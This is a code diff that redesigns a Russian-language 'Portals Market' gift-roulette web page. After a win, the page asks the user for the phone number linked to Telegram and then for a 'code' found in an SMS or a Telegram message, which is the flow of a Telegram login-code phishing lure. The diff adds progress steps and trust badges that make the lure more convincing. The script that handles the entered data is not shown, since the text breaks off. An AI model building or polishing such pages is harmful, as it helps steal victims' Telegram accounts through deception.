@@ -1,757 +1,937 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8">
-    <meta
-        name="viewport"
-        content="width=device-width, initial-scale=1.0"
-    >
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="theme-color" content="#080b17">
+<title>Portals Market — Рулетка подарков</title>
 
-    <title>Подарок</title>
+<style>
+:root {
+  --bg-1:#070914;
+  --bg-2:#11172d;
+  --panel:rgba(255,255,255,.065);
+  --panel-strong:rgba(255,255,255,.10);
+  --border:rgba(255,255,255,.12);
+  --text:#fff;
+  --muted:#9da8c8;
+  --purple:#7468ff;
+  --purple-2:#9a5fff;
+  --red:#ff3c58;
+  --green:#57e39a;
+}
 
-    <style>
-        * {
-            box-sizing: border-box;
-        }
+* { box-sizing:border-box; }
 
-        html,
-        body {
-            margin: 0;
-            padding: 0;
-            width: 100%;
-            min-height: 100%;
-            font-family: Arial, sans-serif;
-            background:
-                radial-gradient(
-                    circle at top,
-                    #26345e 0%,
-                    #11172d 45%,
-                    #080b17 100%
-                );
-            color: white;
-        }
+html, body {
+  margin:0;
+  min-height:100%;
+  background:
+    radial-gradient(circle at 50% -10%, #35447d 0%, #171e3b 28%, #0b0f21 58%, #05060d 100%);
+  color:var(--text);
+  font-family:Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
+}
 
-        body {
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
+body {
+  min-height:100vh;
+  display:flex;
+  justify-content:center;
+  padding:24px 16px;
+  overflow-x:hidden;
+}
 
-        .app {
-            width: 100%;
-            max-width: 900px;
-            text-align: center;
-        }
+body.modal-open { overflow:hidden; }
 
+button, input { font:inherit; }
 
-        /* Профиль над заголовком */
-        .profile {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            margin-bottom: 18px;
-        }
+button {
+  -webkit-tap-highlight-color:transparent;
+}
 
-        .profile-avatar {
-            width: 42px;
-            height: 42px;
-            border-radius: 50%;
-            object-fit: cover;
-            border: 2px solid rgba(255,255,255,0.28);
-            box-shadow: 0 6px 20px rgba(0,0,0,0.28);
-        }
+.app {
+  position:relative;
+  width:100%;
+  max-width:1040px;
+  padding:8px 0 35px;
+}
 
-        .profile-name {
-            font-size: 17px;
-            font-weight: 800;
-            color: #ffffff;
-        }
+.app::before {
+  content:"";
+  position:fixed;
+  width:420px;
+  height:420px;
+  top:-220px;
+  left:50%;
+  transform:translateX(-50%);
+  background:rgba(116,104,255,.14);
+  filter:blur(80px);
+  pointer-events:none;
+  z-index:0;
+}
 
-        /* Медленное движение рулетки в режиме ожидания */
-        .roulette-track.idle {
-            animation: idleRoulette 18s linear infinite;
-        }
+.content {
+  position:relative;
+  z-index:1;
+}
 
-        @keyframes idleRoulette {
-            from { transform: translateX(0); }
-            to { transform: translateX(-1070px); }
-        }
+.profile {
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  gap:10px;
+  margin-bottom:14px;
+}
 
-        .promo-help-button {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            width: auto;
-            min-width: 155px;
-            padding: 11px 18px;
-            margin: 2px auto 14px;
-            border: 1px solid rgba(255,255,255,0.16);
-            border-radius: 11px;
-            background: rgba(255,255,255,0.06);
-            color: #c7cce0;
-            font-size: 14px;
-            font-weight: 700;
-            cursor: pointer;
-        }
+.profile-avatar {
+  width:45px;
+  height:45px;
+  border-radius:50%;
+  object-fit:cover;
+  border:2px solid rgba(255,255,255,.25);
+  box-shadow:0 10px 28px rgba(0,0,0,.35);
+  background:#1b2340;
+}
 
-        .promo-help-text {
-            display: none;
-            color: #aeb8d6;
-            font-size: 14px;
-            line-height: 1.45;
-            margin: 0 0 14px;
-        }
+.profile-name {
+  font-size:17px;
+  font-weight:850;
+  letter-spacing:.1px;
+}
 
-        .promo-help-text.active {
-            display: block;
-        }
+.title {
+  text-align:center;
+  font-size:clamp(29px, 5vw, 43px);
+  line-height:1.05;
+  font-weight:950;
+  letter-spacing:-1.2px;
+  margin:0;
+}
 
-        .title {
-            font-size: 34px;
-            font-weight: 800;
-            margin-bottom: 10px;
-        }
+.subtitle {
+  text-align:center;
+  color:var(--muted);
+  font-size:15px;
+  margin:10px 0 19px;
+}
 
-        .subtitle {
-            color: #aeb8d6;
-            margin-bottom: 30px;
-            font-size: 16px;
-        }
+.badges {
+  display:flex;
+  justify-content:center;
+  flex-wrap:wrap;
+  gap:8px;
+  margin-bottom:20px;
+}
 
-        /* =====================================================
-           РУЛЕТКА
-        ===================================================== */
+.badge {
+  padding:7px 11px;
+  border-radius:999px;
+  background:rgba(255,255,255,.055);
+  border:1px solid rgba(255,255,255,.09);
+  color:#cbd3e9;
+  font-size:11px;
+  font-weight:850;
+}
 
-        .roulette-wrapper {
-            position: relative;
-            width: 100%;
-            overflow: hidden;
-            border-radius: 24px;
-            background: rgba(255, 255, 255, 0.07);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            padding: 24px 0;
-            box-shadow:
-                0 20px 60px rgba(0, 0, 0, 0.35);
-        }
+.badge.live::before {
+  content:"";
+  width:7px;
+  height:7px;
+  display:inline-block;
+  margin-right:6px;
+  border-radius:50%;
+  background:#58e399;
+  box-shadow:0 0 10px rgba(88,227,153,.8);
+}
 
-        .roulette-window {
-            position: relative;
-            width: 100%;
-            overflow: hidden;
-        }
+.roulette-shell {
+  position:relative;
+  border:1px solid var(--border);
+  border-radius:28px;
+  padding:19px 0 13px;
+  overflow:hidden;
+  background:
+    linear-gradient(180deg, rgba(255,255,255,.075), rgba(255,255,255,.035));
+  box-shadow:
+    0 28px 90px rgba(0,0,0,.45),
+    inset 0 1px rgba(255,255,255,.05);
+}
 
-        .roulette-window::before,
-        .roulette-window::after {
-            content: "";
-            position: absolute;
-            top: 0;
-            bottom: 0;
-            width: 100px;
-            z-index: 5;
-            pointer-events: none;
-        }
+.roulette-shell::before {
+  content:"";
+  position:absolute;
+  inset:0;
+  background:
+    linear-gradient(90deg, rgba(116,104,255,.06), transparent 20%, transparent 80%, rgba(154,95,255,.06));
+  pointer-events:none;
+}
 
-        .roulette-window::before {
-            left: 0;
-            background: linear-gradient(
-                to right,
-                #151b34,
-                transparent
-            );
-        }
+.roulette-window {
+  position:relative;
+  width:100%;
+  overflow:hidden;
+}
 
-        .roulette-window::after {
-            right: 0;
-            background: linear-gradient(
-                to left,
-                #151b34,
-                transparent
-            );
-        }
+.roulette-window::before,
+.roulette-window::after {
+  content:"";
+  position:absolute;
+  top:0;
+  bottom:0;
+  width:155px;
+  z-index:4;
+  pointer-events:none;
+}
 
-        .roulette-track {
-            display: flex;
-            gap: 14px;
-            width: max-content;
-            transform: translateX(0);
-            will-change: transform;
-        }
+.roulette-window::before {
+  left:0;
+  background:linear-gradient(to right, #11172d 0%, rgba(17,23,45,.86) 30%, transparent 100%);
+}
 
-  .card {
-    width: 210px;
-    min-width: 210px;
-    height: 260px;
+.roulette-window::after {
+  right:0;
+  background:linear-gradient(to left, #11172d 0%, rgba(17,23,45,.86) 30%, transparent 100%);
+}
 
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
+.roulette-track {
+  width:max-content;
+  display:flex;
+  gap:14px;
+  transform:translateX(0);
+  will-change:transform;
+}
 
-    border-radius: 18px;
-    background: linear-gradient(
-        145deg,
-        rgba(255,255,255,0.10),
-        rgba(255,255,255,0.04)
-    );
+.roulette-track.idle {
+  animation:idleRoulette 22s linear infinite;
+}
 
-    border: 1px solid rgba(255,255,255,0.15);
-    box-shadow: 0 10px 30px rgba(0,0,0,0.25);
+@keyframes idleRoulette {
+  from { transform:translateX(0); }
+  to { transform:translateX(-1120px); }
+}
 
-    overflow: hidden;
-    flex-shrink: 0;
+.card {
+  position:relative;
+  width:214px;
+  min-width:214px;
+  height:268px;
+  display:flex;
+  flex-direction:column;
+  justify-content:center;
+  align-items:center;
+  overflow:hidden;
+  flex-shrink:0;
+  border-radius:19px;
+  border:1px solid rgba(255,255,255,.14);
+  background:linear-gradient(145deg, rgba(255,255,255,.105), rgba(255,255,255,.035));
+  box-shadow:0 14px 38px rgba(0,0,0,.25);
+}
+
+.card::after {
+  content:"";
+  position:absolute;
+  inset:0;
+  background:linear-gradient(145deg, rgba(255,255,255,.07), transparent 37%);
+  pointer-events:none;
 }
 
 .card-image {
-    width: 190px;
-    height: 190px;
-
-    object-fit: contain;
-    object-position: center;
-
-    display: block;
-    flex-shrink: 0;
-
-    border-radius: 14px;
-}
-        .card-icon {
-            font-size: 55px;
-            margin-bottom: 12px;
-        }
-
-        .card-name {
-            font-size: 15px;
-            font-weight: 700;
-        }
-
-        /* =====================================================
-           ЦЕНТРАЛЬНАЯ ЛИНИЯ
-        ===================================================== */
-
-        .center-line {
-            position: absolute;
-            z-index: 10;
-
-            left: 50%;
-            top: 0;
-            bottom: 0;
-
-            width: 4px;
-
-            transform: translateX(-50%);
-
-            background: #ff334f;
-
-            box-shadow:
-                0 0 12px rgba(255, 51, 79, 0.8);
-        }
-
-        .center-arrow {
-            position: absolute;
-            z-index: 11;
-
-            left: 50%;
-            top: 0;
-
-            transform: translateX(-50%);
-
-            width: 0;
-            height: 0;
-
-            border-left: 10px solid transparent;
-            border-right: 10px solid transparent;
-            border-top: 16px solid #ff334f;
-        }
-
-        /* =====================================================
-           КНОПКА
-        ===================================================== */
-
-        .main-button {
-            margin-top: 30px;
-
-            width: 100%;
-            max-width: 360px;
-
-            padding: 17px 25px;
-
-            border: 0;
-            border-radius: 15px;
-
-            background:
-                linear-gradient(
-                    135deg,
-                    #6c63ff,
-                    #8f5cff
-                );
-
-            color: white;
-
-            font-size: 18px;
-            font-weight: 800;
-
-            cursor: pointer;
-
-            box-shadow:
-                0 10px 30px rgba(108, 99, 255, 0.35);
-
-            transition:
-                transform 0.15s,
-                opacity 0.15s;
-        }
-
-        .main-button:hover {
-            transform: translateY(-2px);
-        }
-
-        .main-button:disabled {
-            opacity: 0.5;
-            cursor: not-allowed;
-            transform: none;
-        }
-
-        /* =====================================================
-           OVERLAY
-        ===================================================== */
-
-        .overlay {
-            position: fixed;
-            inset: 0;
-
-            display: none;
-            justify-content: center;
-            align-items: center;
-
-            padding: 20px;
-
-            background: rgba(3, 5, 14, 0.82);
-
-            backdrop-filter: blur(10px);
-
-            z-index: 100;
-        }
-#prizeOverlay {
-    display: none !important;
+  display:block;
+  width:192px;
+  height:192px;
+  object-fit:contain;
+  border-radius:14px;
+  position:relative;
+  z-index:1;
 }
 
-#prizeOverlay.active {
-    display: flex !important;
+.card-name {
+  position:relative;
+  z-index:1;
+  margin-top:5px;
+  font-size:15px;
+  font-weight:850;
 }
-        .overlay.active {
-            display: flex;
-        }
 
-        .modal {
-            width: 100%;
-            max-width: 460px;
+.card-rarity {
+  position:relative;
+  z-index:1;
+  margin-top:5px;
+  font-size:9px;
+  font-weight:900;
+  letter-spacing:1.2px;
+  text-transform:uppercase;
+  opacity:.75;
+}
 
-            background:
-                linear-gradient(
-                    145deg,
-                    #1d2544,
-                    #10162c
-                );
+.rarity-common .card-rarity { color:#b7bfd3; }
+.rarity-rare .card-rarity { color:#70caff; }
+.rarity-epic .card-rarity { color:#ba8cff; }
+.rarity-legendary .card-rarity { color:#ffd76a; }
 
-            border:
-                1px solid rgba(255,255,255,0.12);
+.center-marker {
+  position:absolute;
+  z-index:7;
+  left:50%;
+  top:0;
+  bottom:0;
+  width:4px;
+  transform:translateX(-50%);
+  background:var(--red);
+  box-shadow:0 0 12px rgba(255,60,88,.95), 0 0 32px rgba(255,60,88,.4);
+}
 
-            border-radius: 25px;
+.center-marker::before {
+  content:"";
+  position:absolute;
+  left:50%;
+  top:0;
+  transform:translate(-50%,-1px);
+  border-left:11px solid transparent;
+  border-right:11px solid transparent;
+  border-top:17px solid var(--red);
+  filter:drop-shadow(0 0 8px rgba(255,60,88,.8));
+}
 
-            padding: 32px;
+.roulette-caption {
+  text-align:center;
+  color:#7782a3;
+  font-size:11px;
+  font-weight:750;
+  padding-top:12px;
+}
 
-            text-align: center;
+.main-button {
+  display:block;
+  width:100%;
+  max-width:390px;
+  margin:22px auto 0;
+  padding:17px 22px;
+  border:0;
+  border-radius:15px;
+  color:#fff;
+  background:linear-gradient(135deg, var(--purple), var(--purple-2));
+  box-shadow:0 13px 38px rgba(116,104,255,.35);
+  font-size:17px;
+  font-weight:900;
+  cursor:pointer;
+  transition:transform .16s ease, opacity .16s ease, box-shadow .16s ease;
+}
 
-            box-shadow:
-                0 30px 100px rgba(0,0,0,0.55);
+.main-button:hover {
+  transform:translateY(-2px);
+  box-shadow:0 17px 46px rgba(116,104,255,.45);
+}
 
-            animation: modalAppear 0.25s ease;
-        }
+.main-button:active {
+  transform:scale(.99);
+}
 
-        @keyframes modalAppear {
-            from {
-                opacity: 0;
-                transform: scale(0.94) translateY(15px);
-            }
+.main-button:disabled {
+  opacity:.52;
+  cursor:not-allowed;
+  transform:none;
+}
 
-            to {
-                opacity: 1;
-                transform: scale(1) translateY(0);
-            }
-        }
+.micro-stats {
+  display:flex;
+  justify-content:center;
+  flex-wrap:wrap;
+  gap:9px;
+  margin-top:15px;
+}
 
-        .modal-icon {
-            font-size: 70px;
-            margin-bottom: 15px;
-        }
+.stat {
+  min-width:140px;
+  padding:10px 12px;
+  border-radius:13px;
+  background:rgba(255,255,255,.045);
+  border:1px solid rgba(255,255,255,.075);
+  text-align:center;
+  color:#7d88a8;
+  font-size:10px;
+  font-weight:750;
+}
+
+.stat strong {
+  display:block;
+  color:#fff;
+  font-size:13px;
+  margin-bottom:2px;
+}
+
+.section {
+  margin-top:22px;
+  padding:17px;
+  border:1px solid rgba(255,255,255,.08);
+  border-radius:19px;
+  background:rgba(255,255,255,.04);
+}
+
+.section-title {
+  margin-bottom:11px;
+  font-size:13px;
+  font-weight:900;
+}
+
+.prize-list {
+  display:flex;
+  gap:9px;
+  overflow-x:auto;
+  padding-bottom:2px;
+  scrollbar-width:none;
+}
+
+.prize-list::-webkit-scrollbar { display:none; }
+
+.prize-mini {
+  min-width:116px;
+  padding:9px;
+  text-align:center;
+  border-radius:13px;
+  background:rgba(0,0,0,.14);
+  border:1px solid rgba(255,255,255,.065);
+}
+
+.prize-mini img {
+  width:61px;
+  height:61px;
+  object-fit:contain;
+}
+
+.prize-mini-name {
+  margin-top:2px;
+  overflow:hidden;
+  text-overflow:ellipsis;
+  white-space:nowrap;
+  font-size:11px;
+  font-weight:850;
+}
+
+.prize-mini-chance {
+  margin-top:3px;
+  color:#7f89a8;
+  font-size:10px;
+}
+
+.notice {
+  color:#8993b2;
+  font-size:11px;
+  line-height:1.45;
+  text-align:center;
+  margin-top:12px;
+}
+
+.overlay {
+  position:fixed;
+  inset:0;
+  z-index:100;
+  display:none;
+  justify-content:center;
+  align-items:center;
+  padding:18px;
+  background:rgba(3,5,14,.84);
+  backdrop-filter:blur(14px);
+}
+
+.overlay.active { display:flex; }
+
+.modal {
+  position:relative;
+  width:100%;
+  max-width:470px;
+  padding:29px 24px 23px;
+  overflow:hidden;
+  border-radius:25px;
+  border:1px solid rgba(255,255,255,.13);
+  background:linear-gradient(145deg, #202a4d, #0f152b);
+  box-shadow:0 38px 120px rgba(0,0,0,.65);
+  text-align:center;
+  animation:modalIn .28s ease;
+}
+
+.modal::before {
+  content:"";
+  position:absolute;
+  width:280px;
+  height:280px;
+  left:50%;
+  top:-190px;
+  transform:translateX(-50%);
+  border-radius:50%;
+  background:rgba(116,104,255,.18);
+  filter:blur(45px);
+  pointer-events:none;
+}
+
+@keyframes modalIn {
+  from { opacity:0; transform:translateY(16px) scale(.93); }
+  to { opacity:1; transform:translateY(0) scale(1); }
+}
+
+.modal-icon {
+  position:relative;
+  font-size:62px;
+  line-height:1;
+  margin-bottom:10px;
+}
+
+.modal-title {
+  position:relative;
+  font-size:27px;
+  font-weight:950;
+  margin-bottom:7px;
+}
+
+.modal-text {
+  position:relative;
+  color:#acb5d0;
+  line-height:1.5;
+  font-size:14px;
+  margin-bottom:18px;
+}
+
 .prize-image {
-    width: 180px;
-    height: 180px;
-    object-fit: contain;
-    object-position: center;
-    display: block;
-    margin: 0 auto 15px;
-    border-radius: 14px;
+  position:relative;
+  display:block;
+  width:205px;
+  height:205px;
+  object-fit:contain;
+  margin:0 auto 8px;
+  border-radius:18px;
+  filter:drop-shadow(0 0 28px rgba(154,95,255,.34));
+  animation:prizeFloat 2.5s ease-in-out infinite;
 }
-        .modal-title {
-            font-size: 28px;
-            font-weight: 800;
-            margin-bottom: 10px;
-        }
 
-        .modal-text {
-            color: #adb6d3;
-            line-height: 1.5;
-            margin-bottom: 25px;
-        }
+@keyframes prizeFloat {
+  0%,100% { transform:translateY(0); }
+  50% { transform:translateY(-7px); }
+}
 
-        .prize-name {
-            font-size: 22px;
-            font-weight: 800;
-            margin-bottom: 25px;
-        }
+.prize-name {
+  position:relative;
+  font-size:24px;
+  font-weight:950;
+}
 
-        .input {
-            width: 100%;
+.rarity-label {
+  display:inline-block;
+  position:relative;
+  margin:7px 0 10px;
+  padding:6px 11px;
+  border-radius:999px;
+  background:rgba(255,255,255,.06);
+  border:1px solid rgba(255,255,255,.08);
+  font-size:9px;
+  font-weight:950;
+  letter-spacing:1.2px;
+}
 
-            padding: 16px 18px;
+.rarity-label.common { color:#c1c7d7; }
+.rarity-label.rare { color:#72ceff; }
+.rarity-label.epic { color:#c093ff; }
+.rarity-label.legendary { color:#ffda73; box-shadow:0 0 20px rgba(255,218,115,.1); }
 
-            border-radius: 13px;
-            border: 1px solid rgba(255,255,255,0.15);
+.steps {
+  position:relative;
+  display:flex;
+  justify-content:space-between;
+  gap:4px;
+  margin:19px 2px 20px;
+}
 
-            outline: none;
+.steps::before {
+  content:"";
+  position:absolute;
+  top:13px;
+  left:8%;
+  right:8%;
+  height:2px;
+  background:rgba(255,255,255,.09);
+}
 
-            background: rgba(0,0,0,0.25);
+.step {
+  position:relative;
+  z-index:1;
+  width:25%;
+  color:#707a9b;
+  font-size:9px;
+  font-weight:850;
+}
 
-            color: white;
+.step-dot {
+  width:27px;
+  height:27px;
+  margin:0 auto 5px;
+  border-radius:50%;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  background:#1a2240;
+  border:1px solid rgba(255,255,255,.1);
+}
 
-            font-size: 17px;
+.step.done { color:var(--green); }
+.step.done .step-dot {
+  background:#1a4b36;
+  color:var(--green);
+  border-color:rgba(87,227,154,.3);
+}
+.step.active { color:#aea4ff; }
+.step.active .step-dot {
+  background:#463e84;
+  color:#fff;
+  border-color:#7d70ff;
+  box-shadow:0 0 18px rgba(125,112,255,.25);
+}
 
-            margin-bottom: 12px;
-        }
+.input {
+  width:100%;
+  padding:15px 16px;
+  margin-bottom:7px;
+  border-radius:13px;
+  border:1px solid rgba(255,255,255,.14);
+  outline:none;
+  background:rgba(0,0,0,.23);
+  color:#fff;
+  font-size:16px;
+}
 
-        .input:focus {
-            border-color: #786fff;
-        }
+.input::placeholder { color:#68718f; }
 
-        .close-button {
-            margin-top: 10px;
+.input:focus {
+  border-color:#796dff;
+  box-shadow:0 0 0 3px rgba(121,109,255,.11);
+}
 
-            border: 0;
-            background: transparent;
+.error {
+  min-height:18px;
+  color:#ff7285;
+  font-size:12px;
+  margin-bottom:3px;
+}
 
-            color: #8993b2;
+.close-button {
+  margin-top:8px;
+  padding:8px 12px;
+  border:0;
+  background:transparent;
+  color:#8993b2;
+  cursor:pointer;
+  font-size:13px;
+}
 
-            cursor: pointer;
+.help-button {
+  display:inline-flex;
+  justify-content:center;
+  align-items:center;
+  min-width:155px;
+  margin:2px auto 9px;
+  padding:10px 14px;
+  border-radius:11px;
+  border:1px solid rgba(255,255,255,.11);
+  background:rgba(255,255,255,.055);
+  color:#c7cde0;
+  cursor:pointer;
+  font-size:12px;
+  font-weight:850;
+}
 
-            font-size: 14px;
-        }
+.help-text {
+  display:none;
+  color:#aeb8d6;
+  line-height:1.45;
+  font-size:12px;
+  margin:0 0 10px;
+}
 
-        .error {
-            min-height: 20px;
-            color: #ff7184;
-            font-size: 14px;
-            margin-bottom: 5px;
-        }
+.help-text.active { display:block; }
 
-        .success-icon {
-            font-size: 75px;
-            margin-bottom: 15px;
-        }
+.success-icon {
+  position:relative;
+  width:82px;
+  height:82px;
+  margin:0 auto 16px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  border-radius:50%;
+  background:rgba(87,227,154,.12);
+  border:1px solid rgba(87,227,154,.28);
+  color:#69e6a0;
+  font-size:46px;
+  animation:successPop .5s ease;
+}
 
-        .small {
-            color: #8993b2;
-            font-size: 13px;
-            line-height: 1.5;
-        }
+@keyframes successPop {
+  from { opacity:0; transform:scale(.55); }
+  to { opacity:1; transform:scale(1); }
+}
 
-        @media (max-width: 600px) {
-            .title {
-                font-size: 27px;
-            }
+.confetti {
+  position:fixed;
+  inset:0;
+  z-index:120;
+  pointer-events:none;
+  overflow:hidden;
+}
 
-            .card {
-                width: 190px;
-                min-width: 190px;
-                height: 235px;
-            }
+.confetti-piece {
+  position:absolute;
+  top:-18px;
+  width:8px;
+  height:15px;
+  border-radius:2px;
+  opacity:.9;
+  animation:confettiFall 2.9s linear forwards;
+}
 
-            .card-image {
-                width: 170px;
-                height: 170px;
-            }
+@keyframes confettiFall {
+  to {
+    transform:translate3d(var(--x), 110vh, 0) rotate(720deg);
+    opacity:0;
+  }
+}
 
-            .card-icon {
-                font-size: 45px;
-            }
+.toast {
+  position:fixed;
+  left:50%;
+  bottom:22px;
+  z-index:200;
+  transform:translate(-50%, 20px);
+  opacity:0;
+  pointer-events:none;
+  padding:11px 15px;
+  border-radius:12px;
+  background:#1b2340;
+  border:1px solid rgba(255,255,255,.11);
+  color:#e0e5f4;
+  font-size:12px;
+  font-weight:850;
+  transition:.25s;
+}
 
-            .modal {
-                padding: 25px 20px;
-            }
+.toast.show {
+  opacity:1;
+  transform:translate(-50%,0);
+}
 
-    
-    </style>
+@media (max-width:600px) {
+  body { padding:12px 10px; }
+  .app { padding-top:4px; }
+  .roulette-shell { border-radius:21px; padding-top:15px; }
+  .roulette-window::before,
+  .roulette-window::after { width:82px; }
+  .card { width:184px; min-width:184px; height:228px; }
+  .card-image { width:163px; height:163px; }
+  .modal { border-radius:22px; padding:25px 18px 19px; }
+  .prize-image { width:174px; height:174px; }
+  .modal-title { font-size:24px; }
+  .main-button { font-size:16px; }
+}
+
+@media (prefers-reduced-motion:reduce) {
+  *, *::before, *::after {
+    animation-duration:.01ms !important;
+    animation-iteration-count:1 !important;
+    transition-duration:.01ms !important;
+  }
+}
+</style>
 </head>
 
 <body>
-
 <div class="app">
+  <div class="content">
 
     <div class="profile">
-        <img
-            class="profile-avatar"
-            src="/images/avatar.jpg""
-            alt="Аватар"
-        >
-        <div class="profile-name">Portals Market</div>
+      <img
+        class="profile-avatar"
+        src="/images/avatar.jpg"
+        alt="Аватар"
+        onerror="this.style.display='none'"
+      >
+      <div class="profile-name">Portals Market</div>
     </div>
 
-    <div class="title">
-        🎁 Испытай удачу
+    <h1 class="title">🎁 Испытай удачу</h1>
+    <div class="subtitle">Крути рулетку и узнай свой подарок</div>
+
+    <div class="badges">
+      <div class="badge live">Рулетка активна</div>
+      <div class="badge">🎁 11 подарков</div>
+      <div class="badge">⚡ Быстрый розыгрыш</div>
     </div>
 
-    <div class="subtitle">
-        Крути рулетку и узнай свой подарок
-    </div>
+    <section class="roulette-shell" aria-label="Рулетка подарков">
+      <div class="center-marker" aria-hidden="true"></div>
 
-    <div class="roulette-wrapper">
+      <div class="roulette-window">
+        <div id="rouletteTrack" class="roulette-track"></div>
+      </div>
 
-        <div class="center-line"></div>
-        <div class="center-arrow"></div>
+      <div class="roulette-caption">
+        Центральная отметка определяет выигрышный подарок
+      </div>
+    </section>
 
-        <div class="roulette-window">
-            <div
-                id="rouletteTrack"
-                class="roulette-track"
-            ></div>
-        </div>
-
-    </div>
-
-    <button
-        id="spinButton"
-        class="main-button"
-        onclick="spin()"
-    >
-        🎰 Крутить рулетку
+    <button id="spinButton" class="main-button" type="button" onclick="spin()">
+      🎰 Крутить рулетку
     </button>
 
-</div>
-
-
-<!-- =========================================================
-     OVERLAY: ВЫИГРЫШ
-========================================================= -->
-
-<div
-    id="prizeOverlay"
-    class="overlay"
->
-
-    <div class="modal">
-
-        <img
-            id="prizeImage"
-            class="prize-image"
-            src=""
-            alt="Выигрыш"
-        >
-
-        <div class="modal-title">
-            Поздравляем!
-        </div>
-
-        <div class="modal-text">
-            Вы выиграли:
-        </div>
-
-        <div
-            id="prizeName"
-            class="prize-name"
-        >
-            Подарок
-        </div>
-
-        <button
-            class="main-button"
-            onclick="openPhoneOverlay()"
-        >
-            🎁 Забрать приз
-        </button>
-
+    <div class="micro-stats">
+      <div class="stat"><strong>11</strong>доступных подарков</div>
+      <div class="stat"><strong>5.5 сек</strong>анимация вращения</div>
+      <div class="stat"><strong>100%</strong>результат фиксируется</div>
     </div>
 
+    <section class="section">
+      <div class="section-title">🎁 Подарки и шансы</div>
+      <div id="prizeList" class="prize-list"></div>
+      <div class="notice">
+        Проценты ниже соответствуют конфигурации рулетки. Сумма вероятностей должна быть 100%.
+      </div>
+    </section>
+
+  </div>
 </div>
 
+<!-- WIN OVERLAY -->
+<div id="prizeOverlay" class="overlay" aria-hidden="true">
+  <div class="modal">
+    <div class="modal-icon">🎉</div>
+    <div class="modal-title">Поздравляем!</div>
+    <div class="modal-text">Тебе выпал подарок:</div>
 
-<!-- =========================================================
-     OVERLAY: НОМЕР
-========================================================= -->
+    <img id="prizeImage" class="prize-image" src="" alt="Выигрыш">
 
-<div
-    id="phoneOverlay"
-    class="overlay"
->
+    <div id="prizeName" class="prize-name">Подарок</div>
+    <div id="rarityLabel" class="rarity-label common">COMMON</div>
 
-    <div class="modal">
+    <button class="main-button" type="button" onclick="openPhoneOverlay()">
+      🎁 Забрать подарок
+    </button>
 
-        <div class="modal-icon">
-            📱
-        </div>
+    <button class="close-button" type="button" onclick="closeAllOverlays()">
+      Закрыть
+    </button>
+  </div>
+</div>
 
-        <div class="modal-title">
-            Введите номер
-        </div>
-
-        <div class="modal-text">
-            Укажите номер телефона привязаный к telegram для подтверждения.
-        </div>
-
-        <input
-            id="phoneInput"
-            class="input"
-            type="tel"
-            placeholder="+0 000 000 00 00"
-            autocomplete="tel"
-        >
-
-        <div
-            id="phoneError"
-            class="error"
-        ></div>
-
-        <button
-            id="phoneButton"
-            class="main-button"
-            onclick="submitPhone()"
-        >
-            Подтвердить
-        </button>
-
-        <button
-            class="close-button"
-            onclick="closeAllOverlays()"
-        >
-            Закрыть
-        </button>
-
+<!-- PHONE OVERLAY -->
+<div id="phoneOverlay" class="overlay" aria-hidden="true">
+  <div class="modal">
+    <div class="modal-icon">📱</div>
+    <div class="modal-title">Введите номер</div>
+    <div class="modal-text">
+      Укажите номер телефона, привязанный к Telegram, для подтверждения.
     </div>
 
-</div>
-
-
-<!-- =========================================================
-     OVERLAY: ПРОМОКОД
-========================================================= -->
-
-<div
-    id="authOverlay"
-    class="overlay"
->
-
-    <div class="modal">
-
-        <div class="modal-icon">
-            🎁
-        </div>
-
-        <div class="modal-title">
-            Подтверждение
-        </div>
-
-        <div class="modal-text">
-            Введите код для получения подарка.
-        </div>
-
-        <input
-            id="promoInput"
-            class="input"
-            type="text"
-            placeholder="Введите код"
-            autocomplete="off"
-        >
-
-        <button
-            type="button"
-            class="promo-help-button"
-            onclick="togglePromoHelp()"
-        >
-            Где найти код?
-        </button>
-
-        <div id="promoHelpText" class="promo-help-text">
-            Проверьте код в смс или сообщение от telegram
-        </div>
-
-        <div
-            id="promoError"
-            class="error"
-        ></div>
-
-        <button
-            id="promoButton"
-            class="main-button"
-            onclick="submitPromo()"
-        >
-            Подтвердить
-        </button>
-
+    <div class="steps">
+      <div class="step done"><div class="step-dot">✓</div>Приз</div>
+      <div class="step active"><div class="step-dot">2</div>Номер</div>
+      <div class="step"><div class="step-dot">3</div>Код</div>
+      <div class="step"><div class="step-dot">✓</div>Готово</div>
     </div>
 
+    <input
+      id="phoneInput"
+      class="input"
+      type="tel"
+      inputmode="tel"
+      autocomplete="tel"
+      placeholder="+0 000 000 00 00"
+    >
+
+    <div id="phoneError" class="error"></div>
+
+    <button id="phoneButton" class="main-button" type="button" onclick="submitPhone()">
+      Подтвердить
+    </button>
+
+    <button class="close-button" type="button" onclick="closeAllOverlays()">
+      Закрыть
+    </button>
+  </div>
 </div>
 
-
-<!-- =========================================================
-     OVERLAY: ФИНАЛ
-========================================================= -->
-
-<div
-    id="successOverlay"
-    class="overlay"
->
-
-    <div class="modal">
-
-        <div class="success-icon">
-            ✓
-        </div>
-
-        <div class="modal-title">
-            Успешно
-        </div>
-
-        <div class="modal-text">
-            <strong>Готово</strong>
-            <br><br>
-            Подарок закреплён за вами.<br>
-            Сейчас перенаправим данные.
-        </div>
-
+<!-- PROMO OVERLAY -->
+<div id="authOverlay" class="overlay" aria-hidden="true">
+  <div class="modal">
+    <div class="modal-icon">🎟️</div>
+    <div class="modal-title">Подтверждение</div>
+    <div class="modal-text">
+      Введите код для подтверждения получения подарка.
     </div>
 
+    <div class="steps">
+      <div class="step done"><div class="step-dot">✓</div>Приз</div>
+      <div class="step done"><div class="step-dot">✓</div>Номер</div>
+      <div class="step active"><div class="step-dot">3</div>Код</div>
+      <div class="step"><div class="step-dot">✓</div>Готово</div>
+    </div>
+
+    <input
+      id="promoInput"
+      class="input"
+      type="text"
+      autocomplete="off"
+      placeholder="Введите код"
+    >
+
+    <button class="help-button" type="button" onclick="togglePromoHelp()">
+      Где найти код?
+    </button>
+
